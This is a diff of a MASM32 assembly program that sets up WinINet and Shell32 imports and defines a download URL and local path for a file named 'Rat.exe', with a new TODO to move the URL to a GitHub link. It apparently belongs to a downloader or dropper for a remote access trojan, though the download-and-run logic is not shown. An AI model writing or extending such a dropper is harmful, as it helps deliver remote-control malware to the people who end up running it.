@@ -8,16 +8,14 @@
     include \masm32\include\windows.inc   ; Windows constants and types (always first)
     include \masm32\include\user32.inc    ; User32.dll functions
     include \masm32\include\kernel32.inc  ; Kernel32.dll functions
+    include \masm32\include\shell32.inc   ; Shell32.dll functions
     include \masm32\include\wininet.inc   ; Windows internet
-    include \masm32\include\shlwapi.inc   ;
-    include \masm32\include\shell32.inc   ;
 
     ; link libraries
     includelib \masm32\lib\user32.lib    
     includelib \masm32\lib\kernel32.lib 
-    includelib \masm32\lib\wininet.lib  
-    includelib \masm32\lib\shlwapi.lib  
-    includelib \masm32\lib\shell32.lib  
+    includelib \masm32\lib\shell32.lib
+    includelib \masm32\lib\wininet.lib
 
     ; constants
     MSGBOX_YES  equ 6h    ; message box yes selected
@@ -60,6 +58,8 @@
     ; downloadUrl   db "http://localhost:8000/x64/Debug/Rat.exe", 0
     downloadUrl    db "http://localhost:8000/x64/Release/Rat.exe", 0
     fileName       db "\\test\\Rat.exe", 0
+
+    ; TODO: replace paths with github link
     
     hInternet      dd 0                    ; handle to internet connection
     hConnect       dd 0                    ; handle to opened URL
